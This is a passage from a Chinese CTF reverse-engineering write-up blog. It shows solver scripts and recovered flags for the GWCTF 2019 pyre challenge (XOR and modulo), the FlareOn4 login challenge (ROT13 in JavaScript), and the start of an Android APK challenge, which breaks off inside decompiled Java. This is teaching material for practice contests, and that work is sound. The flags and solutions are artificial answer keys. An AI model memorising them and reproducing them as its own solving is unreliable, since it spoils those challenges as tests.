punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Do not forget to change input to hex and combine~\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"ByeBye"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>明天再说</p><h2 id="注册程序的破解-CTF向"><a href="#注册程序的破解-CTF向" class="headerlink" title="注册程序的破解(CTF向)"></a>注册程序的破解(CTF向)</h2><h3 id><a href="#" class="headerlink" title=" "></a> </h3><h2 id="其他文件逆向"><a href="#其他文件逆向" class="headerlink" title="其他文件逆向"></a>其他文件逆向</h2><h3 id="pyc文件逆向"><a href="#pyc文件逆向" class="headerlink" title="pyc文件逆向"></a>pyc文件逆向</h3><h4 id="GWCTF-2019-pyre"><a href="#GWCTF-2019-pyre" class="headerlink" title="[GWCTF 2019]pyre"></a>[GWCTF 2019]pyre</h4><p><strong>考的知识点</strong></p><p>主要是<code>异或</code>、<code>取模</code>的特性，都很简单，这里就不再多做介绍了。异或的特性主要就是<code>a^a^b=b</code></p><p><strong>解题过程</strong></p><p>懒得再下函数库了，直接<a href="https://tool.lu/pyc/">在线网站</a>搞算了。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token comment"># visit http://tool.lu/pyc/ for more information</span><span class="token keyword">print</span> <span class="token string">'Welcome to Re World!'</span><span class="token keyword">print</span> <span class="token string">'Your input1 is your flag~'</span>l <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>input1<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">:</span>    num <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>input1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">128</span> <span class="token operator">+</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">128</span>    code <span class="token operator">+=</span> num<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>l <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    code<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> code<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> code<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token keyword">print</span> codecode <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'\x1f'</span><span class="token punctuation">,</span><span class="token string">'\x12'</span><span class="token punctuation">,</span><span class="token string">'\x1d'</span><span class="token punctuation">,</span><span class="token string">'('</span><span class="token punctuation">,</span><span class="token string">'0'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'\x01'</span><span class="token punctuation">,</span><span class="token string">'\x06'</span><span class="token punctuation">,</span><span class="token string">'\x14'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">','</span><span class="token punctuation">,</span><span class="token string">'\x1b'</span><span class="token punctuation">,</span><span class="token string">'U'</span><span class="token punctuation">,</span><span class="token string">'?'</span><span class="token punctuation">,</span><span class="token string">'o'</span><span class="token punctuation">,</span><span class="token string">'6'</span><span class="token punctuation">,</span><span class="token string">'*'</span><span class="token punctuation">,</span><span class="token string">':'</span><span class="token punctuation">,</span><span class="token string">'\x01'</span><span class="token punctuation">,</span><span class="token string">'D'</span><span class="token punctuation">,</span><span class="token string">';'</span><span class="token punctuation">,</span><span class="token string">'%'</span><span class="token punctuation">,</span><span class="token string">'\x13'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>逆向的脚本如下，这里是老逆向知识考点了，感觉很老很老的了。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token comment"># visit http://tool.lu/pyc/ for more information</span><span class="token triple-quoted-string string">"""print('Welcome to Re World!')print('Your input1 is your flag~')input1 = 'flag'code = ''l = len(input1)for i in range(l):    num = ((ord(input1[i]) + i) % 128 + 128) % 128    code += chr(num)for i in range(l - 1):    code[i] = code[i] ^ code[i + 1]"""</span>code <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'\x1f'</span><span class="token punctuation">,</span> <span class="token string">'\x12'</span><span class="token punctuation">,</span> <span class="token string">'\x1d'</span><span class="token punctuation">,</span> <span class="token string">'('</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'\x01'</span><span class="token punctuation">,</span> <span class="token string">'\x06'</span><span class="token punctuation">,</span> <span class="token string">'\x14'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">','</span><span class="token punctuation">,</span> <span class="token string">'\x1b'</span><span class="token punctuation">,</span> <span class="token string">'U'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'o'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">,</span> <span class="token string">':'</span><span class="token punctuation">,</span>        <span class="token string">'\x01'</span><span class="token punctuation">,</span> <span class="token string">'D'</span><span class="token punctuation">,</span> <span class="token string">';'</span><span class="token punctuation">,</span> <span class="token string">'%'</span><span class="token punctuation">,</span> <span class="token string">'\x13'</span><span class="token punctuation">]</span>l <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>l <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    code<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>code<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>code<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    code<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>code<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">:</span>    num <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>code<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> i<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">128</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token comment"># GWHT&#123;Just_Re_1s_Ha66y!&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="js文件逆向"><a href="#js文件逆向" class="headerlink" title="js文件逆向"></a>js文件逆向</h3><p>这里的主要考点应该主要是对于算法的逆向，这种题目往往比较简单，没有什么复杂的逻辑（应该），经常作为签到题目出现。</p><h4 id="FlareOn4-login"><a href="#FlareOn4-login" class="headerlink" title="[FlareOn4]login"></a>[FlareOn4]login</h4><p>给出的是一个html的网页，主要逆向里面的js内容的算法，其中js的内容如下</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"prompt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">onclick</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> flag <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>    <span class="token keyword">var</span> rotFlag <span class="token operator">=</span> flag<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/[a-zA-Z]/g</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">c</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token punctuation">(</span>c <span class="token operator">&lt;=</span> <span class="token string">"Z"</span> <span class="token operator">?</span> <span class="token number">90</span> <span class="token operator">:</span> <span class="token number">122</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token punctuation">(</span>c <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">13</span><span class="token punctuation">)</span> <span class="token operator">?</span> c <span class="token operator">:</span> c <span class="token operator">-</span> <span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"PyvragFvqrYbtvafNerRnfl@syner-ba.pbz"</span> <span class="token operator">==</span> rotFlag<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Correct flag!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Incorrect flag, rot again"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>主要负责对flag内容进行转换的是下面的功能代码，稍微改了下成了能看懂的样子。</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> rotFlag <span class="token operator">=</span> flag<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/[a-zA-Z]/g</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">c</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>            <span class="token punctuation">(</span>c <span class="token operator">&lt;=</span> <span class="token string">"Z"</span> <span class="token operator">?</span> <span class="token number">90</span> <span class="token operator">:</span> <span class="token number">122</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token punctuation">(</span>c <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">13</span><span class="token punctuation">)</span> <span class="token operator">?</span> c <span class="token operator">:</span> c <span class="token operator">-</span> <span class="token number">26</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那个<code>replace</code>函数负责遍历所有大小写字母，后面的<code>function</code>主要负责进行转换，将每个大小写字母带入其中即可，其中<code>90-&gt;&#39;Z&#39;</code>、<code>122-&gt;&#39;z&#39;</code>。后面的就很简单了，</p><ol><li>如果该字符是大写字母就将<code>Z</code>的ASCII码值与<code>c本身的ASCII码值+13</code>进行比较</li><li>如果<code>Z</code>比较大，就返回c本身的字符串，</li><li>反之则返回c的ASCII码值<code>-26</code>的数值所代表的ASCII字符。</li><li>小写字母是亦同理。</li></ol><p>这就是非常经典的rot13密码了，rot13密码是凯撒密码的延申。它的加解密是对等的</p><p><img src="/2021/05/28/CTF/image-20210531174558489.png" alt="image-20210531174558489"></p><p>rot13密码是经典的凯撒密码，凯撒密码移位13位就是rot13了，本身是没有什么技术难度的，（口算都能破解）</p><p><img src="/2021/05/28/CTF/image-20210531174817470.png" alt="image-20210531174817470"></p><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">flag&#123;ClientSideLoginsAreEasy@flare-on.com&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="MOBILE"><a href="#MOBILE" class="headerlink" title="MOBILE"></a>MOBILE</h1><h2 id="方向介绍"><a href="#方向介绍" class="headerlink" title="方向介绍"></a>方向介绍</h2><p>这个方向本来是分属于reverse方向的，但是呢，最近的CTF赛题看起来有将mobile移动安全专门划分出来的趋势，再加上我个人对移动安全也十分感兴趣，所以也将mobile单独分类出来。也是为了便于日后总结学习。</p><h2 id="一般Android逆向"><a href="#一般Android逆向" class="headerlink" title="一般Android逆向"></a>一般Android逆向</h2><h3 id="buu、findit"><a href="#buu、findit" class="headerlink" title="buu、findit"></a>buu、findit</h3><p><strong>题目描述</strong></p><p>不知不觉，小明长大了，变成了一个程序员，虽然很苦逼，但是偶尔编写个小东西坑害公司新人还是蛮好玩的。新人小萌一天问小明wifi账号密码，一分钟后，小萌收到了一个文件。小萌想了好久都没得到密码，怎么办，女朋友要买东西，流量告罄，没wifi上不了网，不买就分手，是时候该展现月老的实力了兄弟们！代表月亮惩罚小明！得出答案。 注意：得到的 flag 请包上 flag{} 提交</p><p><a href="https://files.buuoj.cn/files/7b8602971727c6c82ec0d360d5cad2c0/6a428ff2-25d7-403c-b28e-3f980a10a5a2.apk?token=eyJ1c2VyX2lkIjo1ODI5LCJ0ZWFtX2lkIjpudWxsLCJmaWxlX2lkIjoyMTV9.YLL-JQ.1mkBIGgecp2UxMwmP7W7hIN_9NM"> buu在线题目附件地址</a></p><p><strong>解题过程</strong></p><p>给出的是一个apk文件，遇到这种先在模拟器中打开看一看软件的主要逻辑。</p><p><img src="/2021/05/28/CTF/image-20210530102603082.png" alt="image-20210530102603082"></p><p>看这种感觉应该是内部已经生成答案了，但是就是没显示出来。用jadx打开之后找到MainActivity函数，反编译出来的java代码如下所示</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>findit</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">android<span class="token punctuation">.</span>os<span class="token punctuation">.</span></span><span class="token class-name">Bundle</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">android<span class="token punctuation">.</span>support<span class="token punctuation">.</span>v7<span class="token punctuation">.</span>app<span class="token punctuation">.</span></span><span class="token class-name">ActionBarActivity</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">android<span class="token punctuation">.</span>view<span class="token punctuation">.</span></span><span class="token class-name">MenuItem</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">android<span class="token punctuation">.</span>view<span class="token punctuation">.</span></span><span class="token class-name">View</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">android<span class="token punctuation">.</span>widget<span class="token punctuation">.</span></span><span class="token class-name">Button</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">android<span class="token punctuation">.</span>widget<span class="token punctuation">.</span></span><span class="token class-name">EditText</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">android<span class="token punctuation">.</span>widget<span class="token punctuation">.</span></span><span class="token class-name">TextView</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MainActivity</span> <span class="token keyword">extends</span> <span class="token class-name">ActionBarActivity</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/* access modifiers changed from: protected */</span>    <span class="token annotation punctuation">@Override</span> <span class="token comment">// android.support.v7.app.ActionBarActivity, android.support.v4.app.FragmentActivity, android.app.Activity</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onCreate</span><span class="token punctuation">(</span><span class="token class-name">Bundle</span> savedInstanceState<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">onCreate</span><span class="token punctuation">(</span>savedInstanceState<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setContentView</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>layout<span class="token punctuation">.</span>activity_main<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">final</span> <span class="token class-name">EditText</span> edit <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">EditText</span><span class="token punctuation">)</span> <span class="token function">findViewById</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>id<span class="token punctuation">.</span>widget2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">final</span> <span class="token class-name">TextView</span> text <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">TextView</span><span class="token punctuation">)</span> <span class="token function">findViewById</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>id<span class="token punctuation">.</span>widget1<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">final</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'T'</span><span class="token punctuation">,</span> <span class="token string">'h'</span><span class="token punctuation">,</span> <span class="token string">'i'</span><span class="token punctuation">,</span> <span class="token string">'s'</span><span class="token punctuation">,</span> <span class="token string">'I'</span><span class="token punctuation">,</span> <span class="token string">'s'</span><span class="token punctuation">,</span> <span class="token string">'T'</span><span class="token punctuation">,</span> <span class="token string">'h'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token string">'F'</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'g'</span><span class="token punctuation">,</span> <span class="token string">'H'</span><span class="token punctuation">,</span> <span class="token string">'o'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token keyword">final</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token string">'v'</span><span class="token punctuation">,</span> <span class="token string">'k'</span><span class="token punctuation">,</span> <span class="token string">'q'</span><span class="token punctuation">,</span> <span class="token string">'&#123;'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">,</span> <span class="token string">'7'</span><span class="token punctuation">,</span> <span class="token string">'5'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'9'</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">,</span> <span class="token string">'n'</span><span class="token punctuation">,</span> <span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token string">'7'</span><span class="token punctuation">,</span> <span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token string">'9'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'n'</span><span class="token punctuation">,</span> <span class="token string">'k'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token string">'8'</span><span class="token punctuation">,</span> <span class="token string">'k'</span><span class="token punctuation">,</span> <span class="token string">'7'</span><span class="token punctuation">,</span> <span class="token string">'5'</span><span class="token punctuation">,</span> <span class="token string">'&#125;'</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Button</span><span class="token punctuation">)</span> <span class="token function">findViewById</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>id<span class="token punctuation">.</span>widget3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setOnClickListener</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">View</span><span class="token punctuation">.</span><span class="token class-name">OnClickListener</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// from class: com.example.findit.MainActivity.1</span>            <span class="token annotation punctuation">@Override</span> <span class="token comment">// android.view.View.OnClickListener</span>            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onClick</span><span class="token punctuation">(</span><span class="token class-name">View</span> v<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> x <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> y <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token number">38</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">17</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'I'</span> <span class="token operator">&amp;&amp;</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token string">'A'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'i'</span> <span class="token operator">&amp;&amp;</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        x<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'A'</span> <span class="token operator">||</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token string">'Z'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'a'</span> <span class="token operator">||</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token string">'z'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        x<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                        x<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token string">'\b'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>edit<span class="token punctuation">.</span><span class="token function">getText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i2 <span class="token operator">&lt;</span> <span class="token number">38</span><span class="token punctuation">;</span> i2<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>b<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'A'</span> <span class="token operator">||</span> b<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token string">'Z'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>b<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'a'</span> <span class="token operator">||</span> b<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token string">'z'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                            y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token punctuation">[</span>i2<span class="token punctuation">]</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                            y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>b<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token string">'Z'</span> <span class="token operator">&amp;&amp;</span> y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token operator">||</span> y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token string">'z'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token 